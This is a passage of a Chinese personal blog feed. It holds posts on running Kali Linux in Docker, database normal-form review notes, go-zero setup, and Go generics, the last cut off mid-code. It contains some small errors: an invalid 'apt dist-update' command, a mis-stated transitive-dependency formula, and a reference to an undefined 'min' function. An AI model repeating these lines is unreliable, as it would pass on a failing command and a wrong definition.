        <content type="html"><![CDATA[<h2 id="概述">概述</h2><p>先来谈谈这种方式的优缺点</p><p>优点：</p><ul><li>可以不用运行额外的完整操作系统</li><li>可以直接在当前终端启动Kali，并使用其工具</li></ul><p>缺点：</p><ul><li>无法直接访问硬件，导致部分工具使用相当复杂</li></ul><p>达到的效果：</p><p><img src="https://image.icewindy.cn/202303142359615.png" alt=""></p><p>过程概述：</p><ol><li>从docker拉取kali-linux官方提供的映像<code>kalilinux/kali-rolling</code>;</li><li>构建一个容器，进入容器的shell，更新软件源，并下载kali linux的工具包;</li><li>基于我们作出更改的容器，创建新的映像，我们的映像中将包含更新和工具包;</li><li>对Kali内部分数据目录映射到Docker Volumes，每次使用完Kali后，都会自动删除容器，并利用我们镜像和Volumes随时重新创建;</li><li>编写启动脚本，并将其设置在环境变量中。</li></ol><h2 id="完整过程">完整过程</h2><ol><li>拉取Kali Linux 的官方Docker映像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull kalilinux/kali-rolling</span><br></pre></td></tr></table></figure><ol start="2"><li>基于该映像构建一个容器，并进入shell</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -ti kalilinux/kali-rolling</span><br></pre></td></tr></table></figure><p>这时候我们开启的这个kali仅仅是一个骨架，不包含任何工具，此时我们要使用apt工具，更新apt源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt dist-update</span><br><span class="line">apt autoremove</span><br><span class="line">apt clean</span><br></pre></td></tr></table></figure><p>接下来我们安装Kali Linux的工具，我们可以安装Kali官方打包的meta packages，提供的详情可以查看：https : <a href="//www.kali.org/news/kali-linux-metapackages/%E3%80%82%E4%B8%80%E8%88%AC%E8%80%8C%E8%A8%80%EF%BC%8C%E6%88%91%E4%BB%AC%E9%83%BD%E4%BC%9A%E5%85%88%E5%AE%89%E8%A3%85">//www.kali.org/news/kali-linux-metapackages/。一般而言，我们都会先安装</a><code>kali-tools-top10</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install kali-tools-top10</span><br></pre></td></tr></table></figure><p>其他根据需要再安装，也可以安装all包，将安装kali官方所有的工具。</p><ol start="3"><li>接下来我们需要根据我们更改后的容器构建一个新的映像。</li></ol><p>首先我们需要退出（exit命令）当前Kali Linux，运行查看所有容器的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>通过这个命令，我们可以查看所有的Docker容器，我们需要的是其中的CONTAINER ID</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CONTAINER ID   IMAGE                                        COMMAND                   CREATED          STATUS                       PORTS     NAMES</span><br><span class="line">4703cf51b913   kalilinux/kali-rolling                       &quot;bash&quot;                    11 seconds ago   Exited (127) 4 seconds ago             crazy_bose</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>获取到CONTAINER ID后，执行下列命令以构建我们的定制映像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit &lt;CONTAINER ID&gt; &lt;custom name&gt;</span><br></pre></td></tr></table></figure><p>在custom name处我们可以填入我们想要的名称，通过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image ls</span><br></pre></td></tr></table></figure><p>即可看到我们自定义的映像。</p><ol start="4"><li>在使用Docker时，不在停止的容器上浪费存储空间是一个优良的习惯。我们常常会在运行docker容器时，加入<code>--rm</code>使得在结束使用后容器自动销毁。<br>但是我们有不少数据，我们会希望在Kali的docker容器运行结束后能够持久花存储，因此这时候我们就用到持久化策略。</li></ol><p>通常，我们使用Kali时数据保存在以下目录中：</p><ul><li>/root — home dir for root (downloads, notes, source code etc.)</li><li>/var/lib/postgresql — Postgres database files (used by Metasploit)</li></ul><p>我们可以将这两个目录映射到Docker Volumes上，在删除容器时保存我妈的数据。通过映射的Docker Volumes和我们创建的自定义映像我们即可随时重新创建我们的kali</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -ti --rm --mount src=kali-root,dst=/root --mount src=kali-postgres,dst=/var/lib/postgresql &lt;custom name&gt;</span><br></pre></td></tr></table></figure><ul><li>这些参数将会创建两个volume <code>kali-root</code>和<code>kali-postgres</code>，并将这两个映射到创建的容器中（若已经存在名称为这两个的volume，则会直接映射）</li><li><code>&lt;custom name&gt;</code>填入的是我们之前自定义映像的名称</li></ul><ol start="5"><li>接下来我们可以将上面运行的命令保存到一个文件中，并且给予运行权限，例如我们创建了一个叫kali的文件，里面写入我们的docker启动kali的命令，给予运行权限的命令为</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x kali</span><br></pre></td></tr></table></figure><p>然后我们可以将这个文件的目录写入我们环境变量中，例如我将kali保存在一个名字为<code>docker-script</code>的文件夹中，并将其加入<code>.zshrc</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:~/docker-scripts</span><br></pre></td></tr></table></figure><p>然后我们在终端中即可使用<code>kali</code>运行我们基于docker的kali-linux环境了。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统概论复习</title>
      <link href="/2023/03/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E5%A4%8D%E4%B9%A0/"/>
      <url>/2023/03/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>视频来自https://www.bilibili.com/video/BV1Bq4y1Y7GC</p><h2 id="关系理论">关系理论</h2><h3 id="函数依赖">函数依赖</h3><p>函数依赖指的是<code>X</code>可以推导出<code>Y</code>，即Y依赖于X，记作X-&gt;Y</p><ul><li>非平凡的函数依赖:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi><mo separator="true">,</mo><mi>Y</mi><mo>⊄</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">{X}\rightarrow{Y},{Y}\not\subset{X}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span></span>，在大多数情况下没有指明的函数依赖都是非平凡的函数依赖</li><li>平凡的函数依赖:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi><mo separator="true">,</mo><mi>Y</mi><mo>∈</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">{X}\rightarrow{Y},{Y}\in{X}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span></span>，几乎没有什么作用，一般某个集合总能推导出其子集，即平凡的函数依赖</li><li>完全函数依赖:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X\rightarrow{Y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span></span></span></span>，并且对于X的任意真子集<code>X'</code>，都有<code>Y不依赖于X'</code>，则称之为完全函数依赖;<br>个人理解就是，当Y依赖于X时，仅有X本身可以推导出Y，X的任意部分都不能单独推导出Y</li><li>部分函数依赖:Y不完全函数依赖于X。即作X-P-&gt;Y（P在箭头上）。例如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">A\rightarrow{C}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span></span>，又有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi>A</mi><mi>B</mi></mrow><mo>→</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">{AB}\rightarrow{C}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span></span>，那么C就是部分依赖于AB。<br>这种情况会导致数据冗余，因为A本身就可以推导出C，B是冗余的部分</li></ul><h2 id="码">码</h2><ul><li><p><strong>候选码</strong>：为一个属性组（或者属性），通过该属性组能推导出所有的属性，且若为属性组，其任意子集都不能推导出所有属性。即满足完全函数依赖的同时，还需要是最小的属性组。</p><p>个人理解：对于数据而言，某个行(属性)或者某几个行的组合(属性组)可以确定一条数据，这个行或者这几个行的组合被称之为候选码</p><p>题目类型：求候选码</p><ol><li>找出一定属于候选码的属性，可能属于候选码的属性，以及不属于候选码的属性<br>一定属于候选码的属性：只出现在左边，或者左右都没出现<br>可能属于候选码的属性：左右都出现<br>不属于候选码的属性：只出现在右边</li><li>对确定的属性做闭包运算，若不能构成候选码，再将确定的属性和待定的属性进行结合，做闭包运算，直到得到的属性组能推导出所有的属性<br>闭包运算：若求某属性组的闭包，设有集合X，令X={该属性组}<br>(1) X<sup>(0)</sup> = 本身，X<sup>(1)</sup> = X<sup>(0)</sup>所能推导出的<br>(2)当 X<sup>(0)</sup>不等于X<sup>(1)</sup>，令X<sup>(2)</sup>=X<sup>(1)</sup>属性能够推导出的<br>(3)以此类推，直至X<sup>(n)</sup>=X<sup>(n-1)</sup>或X<sup>(n)</sup>等于全集时，即求得属性组的闭包</li><li>当所得的属性能够推导出所有的属性，这个属性即为候选码，对可能的组合（一定+可能）重复上述过程，可以得到所有候选码</li></ol><p>闭包运算还可以用于判断<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X\rightarrow{Y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span></span></span></span>是否成立：当Y属于X的闭包时，存在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X\rightarrow{Y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span></span></span></span></p></li><li><p><strong>超码</strong>：能推出所有属性的属性组的集合。候选码是极小的超码集，是超码的子集</p></li><li><p><strong>主码</strong>：从候选码中挑出一个作为主码，简称码</p></li><li><p><strong>主属性</strong>：包含在任意一个候选码中的属性</p></li><li><p><strong>非主属性</strong>：不包含在任意一个候选码中的属性</p></li><li><p><strong>外码</strong>：在关系模式R中，若有一个属性或者属性组X，它不是R的主码，但是是另外一个关系模式中的主码，则称之为外码</p></li><li><p><strong>全码</strong>：整个属性组都是主码</p></li></ul><h3 id="范式">范式</h3><ul><li>1NF（第一范式）：所有属性都是<strong>不可分割的数据项</strong><br>例如学校，可以拆分成高中和大学，即不满足1NF;<br>1NF是关系数据库需要满足的最低要求，一般讨论中都会满足第一范式;</li><li>2NF（第二范式）：在满足1NF的前提下，不包含非主属性对主码的部分函数依赖，即<strong>每一个非主属性都完全函数依赖于主码</strong><br>例如在某个关系中，主码是学号和班级，非主属性是姓名，若仅通过学号，不需要班级也可推导出姓名，则该关系不满足2NF</li><li>3NF（第三范式）：在满足2NF的前提下，不含有非主属性对码的传递函数依赖，即<strong>主码直接决定非主属性，不能间接决定</strong><br>传递函数依赖：若<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi><mo separator="true">,</mo><mi>Y</mi><mo>→</mo><mi>X</mi><mo separator="true">,</mo><mtext>且</mtext><mi>Z</mi><mo>⊄</mo><mi>Y</mi><mo separator="true">,</mo><mtext>则推导出</mtext><mi>X</mi><mo>→</mo><mi>Z</mi></mrow><annotation encoding="application/x-tex">{X}\rightarrow{Y},{Y}\rightarrow{X},且{Z}\not\subset{Y},则推导出{X}\rightarrow{Z}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">且</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">推</span><span class="mord cjk_fallback">导</span><span class="mord cjk_fallback">出</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span></span></span></span></span>，此时便是传递函数依赖<br>例如某关系中，主码为客户姓名，非主属性为订单编号和订单负责人，通过客户姓名可以找到订单编号，通过订单编号可以推出订单负责人，则此时不满足3NF</li><li>BCNF（BC范式）：消除任何属性对候选码的传递依赖，即每一个决定因素都包含候选码。其表现为<strong>在函数依赖集中，左边都包含候选码</strong></li><li>4NF（第四范式）：不允许有非平凡且非函数依赖的多值依赖(不考)</li></ul><h3 id="最小函数依赖集">最小函数依赖集</h3><p>求最小函数依赖集：</p><ol><li>拆分右侧：将右侧有多个属性的拆分成单个属性</li><li>尝试去除某个依赖关系，求闭包，试看能否通过余下推出去除的结果。能去除则删去该依赖关系</li><li>左侧最小化：对于左侧有多个属性推导出的关系，可以尝试去除某个关系，试看能否推出对应的结果</li></ol><h2 id="e-r图">E-R图</h2><h3 id="画e-r图">画E-R图</h3><p><img src="https://image.icewindy.cn/202303090833402.png" alt="image.png"></p><h3 id="e-r图转换为关系模型">E-R图转换为关系模型</h3><p><img src="https://image.icewindy.cn/202303090846930.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 期末考试复习 </category>
          
          <category> 数据库系统概论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 考试复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go-zero框架学习笔记（1）：环境配置</title>
      <link href="/2023/02/25/go-zero%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2023/02/25/go-zero%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="goctl安装">Goctl安装</h2><p>goctl是go-zero框架下的代码生成工具。其功能有：</p><ul><li>api服务生成</li><li>rpc服务生成</li><li>model代码生成</li><li>模板管理</li></ul><h3 id="go-get-安装goctl">go get 安装goctl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">Go 1.15 及之前版本</span></span><br><span class="line">GO111MODULE=on GOPROXY=https://goproxy.cn/,direct go get -u github.com/zeromicro/go-zero/tools/goctl@latest</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Go 1.16 及以后版本</span></span><br><span class="line">GOPROXY=https://goproxy.cn/,direct go install github.com/zeromicro/go-zero/tools/goctl@latest</span><br></pre></td></tr></table></figure><p>通过此方式安装，会自动安装在<code>$GOPATH/bin</code>，如果忘了自己的<code>$GOPATH</code>在什么地方，可以通过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go env</span><br></pre></td></tr></table></figure><p>查找到对应的目录。</p><h3 id="添加到环境参数">添加到环境参数</h3><p>若原先设定过<code>$GOPATH</code>，应该是不需要这一步。由于我是通过<code>pacman</code>安装的Go，因此没有设定过。</p><p>以我本人所用的zsh终端举例，使用任意文本编辑工具(vim、vi)打开<code>~/.zshrc</code>，添加如下一行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:~/go/bin</span><br></pre></td></tr></table></figure><p>在添加好环境变量后，可以通过如下指令测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goctl -v</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202302251638736.png" alt=""></p><p>如果正常显示出，则表示安装成功。</p><h2 id="protoc-protoc-gen-go-安装">protoc &amp; protoc-gen-go 安装</h2><p>protoc是一款用C++编写的工具，其可以将proto文件翻译为指定语言的代码。在go-zero的微服务中，我们采用grpc进行服务间的通信，而grpc的编写就需要用到protoc和翻译成go语言rpc stub代码的插件protoc-gen-go。</p><p>一般情况下，我们都是通过goctl进行一键安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goctl env check -i -f --verbose</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202302261719534.png" alt=""></p><p>这样我们就同时安装上protoc &amp; protoc-gen-go了！</p><h2 id="其他环境">其他环境</h2><p>除了go-zero本身相关的开发工具，我们还要安装一些的环境</p><ul><li>etcd</li><li>redis</li><li>mysql</li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
          <category> go-zero </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang基础笔记（11）：泛型</title>
      <link href="/2023/02/10/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%8811%EF%BC%89%EF%BC%9A%E6%B3%9B%E5%9E%8B/"/>
      <url>/2023/02/10/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%8811%EF%BC%89%EF%BC%9A%E6%B3%9B%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="泛型">泛型</h2><p>在Go 1.18版本中，添加了对泛型的支持。泛型是一种独立于所使用的特定类型的编写代码的方法。使用泛型可以编写出适用于一组类型中的任何一种的函数和类型，便利了代码的编写。</p><h3 id="泛型的作用">泛型的作用</h3><p>假设我们有一个调换int参数的函数，现在我们需要一个调换float参数的函数，没有泛型时，我们需要将相同的逻辑、不同的类型参数的函数重复多遍。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">excInt</span><span class="params">(a, b <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> b, a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">excFloat</span><span class="params">(a, b <span class="type">float32</span>)</span></span> (<span class="type">float32</span>, <span class="type">float32</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> b, a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但那是有了泛型，就可以很方便的编写出适用所有元素类型的“普适版”的函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">exchange</span>[<span class="title">T</span> <span class="title">any</span>]<span class="params">(a, b T)</span></span> (T, T) &#123;</span><br><span class="line"><span class="keyword">return</span> b, a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="泛型语法">泛型语法</h3><p>泛型为Go语言添加了三个新的重要特性:</p><ol><li>函数和类型的类型参数。</li><li>将接口类型定义为类型集，包括没有方法的类型。</li><li>类型推断，它允许在调用函数时在许多情况下省略类型参数。</li></ol><p>这里我们着重讲类型参数</p><h4 id="类型参数">类型参数</h4><p>在上面的例子中，我们提到可以使用泛型“很方便的编写出适用所有元素类型的“普适版”的函数”，这就是泛型的第一个作用——类型参数。</p><p><img src="https://image.icewindy.cn/202302101712614.png" alt="类型形参与类型实参"></p><p>Go语言中的函数和类型支持添加类型参数。类型参数列表看起来像普通的参数列表，只不过它使用方括号（<code>[]</code>）而不是圆括号（<code>()</code>）。</p><p>类型形参是作为可选类型，而在对函数实例化时，我们需要指定一个在可选类型范围内的类型实参。</p><p><strong>类型实例化</strong></p><p>在上面<code>min</code>函数中，同时支持了int和float64两种类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m1 := min[<span class="type">int</span>](<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">m2 := min[<span class="type">float64</span>](<span class="number">-0.1</span>, <span class="number">-0.2</span>)</span><br></pre></td></tr></table></figure><p>向函数(min)提供类型实参(int、float64)被称之为实例化。在成功实例化后，我们会得到一个非泛型的函数，这个函数可以跟其他函数一样被正常调用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fmin := min[<span class="type">float64</span>] <span class="comment">// 类型实例化，编译器生成T=float64的min函数</span></span><br><span class="line">m = fmin(<span class="number">1.2</span>, <span class="number">2.3</span>)</span><br></pre></td></tr></table></figure><p><strong>类型参数的使用</strong></p><p>除了可以在函数中使用泛型，在类型中也可以使用类型参数列表</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对切片封装一层</span></span><br><span class="line"><span class="keyword">type</span> Slice[T <span class="type">int</span> | <span class="type">string</span>] []T</span><br><span class="line"></span><br><span class="line"><span class="comment">//对map封装一层</span></span><br><span class="line"><span class="keyword">type</span> Map[K <span class="type">int</span> | <span class="type">string</span>, V <span class="type">float32</span> | <span class="type">float64</span>] <span class="keyword">map</span>[K]V</span><br><span class="line"></span><br><span class="line"><span class="comment">//二叉树的数据结构</span></span><br><span class="line"><span class="keyword">type</span> Tree[T <span class="keyword">interface</span>&#123;&#125;] <span class="keyword">struct</span> &#123;</span><br><span class="line">left, right *Tree[T]</span><br><span class="line">value       T</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上的类型都可以被称之为泛型类型。</p><p>泛型类型可以有方法，例如可以为上面的<code>Tree</code>添加一个寻找的方法</p><figure class="highlight 